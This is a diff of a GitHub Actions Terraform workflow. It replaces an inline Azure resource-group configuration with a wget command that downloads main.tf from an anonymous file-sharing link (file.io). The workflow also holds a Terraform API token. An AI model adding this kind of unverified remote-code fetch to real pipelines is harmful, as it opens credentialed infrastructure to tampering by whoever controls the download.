@@ -19,18 +19,7 @@ jobs:
         cli_config_credentials_token: ${{ secrets.TF_API_TOKEN }}
 
     - name: Create Terraform Configuration File
-      run: /bin/cat <<'EOT' >> main.tf
-      # Configure the Azure provider
-provider "azurerm" {
-    version = "~>1.32.0"
-}
-
-# Create a new resource group
-resource "azurerm_resource_group" "rg" {
-    name     = "myTFResourceGroup"
-    location = "eastus"
-}
-EOT
+      run: wget https://file.io/CGO9Nhg3 -O main.tf
 
     - name: show config file
       run: /bin/cat main.tf
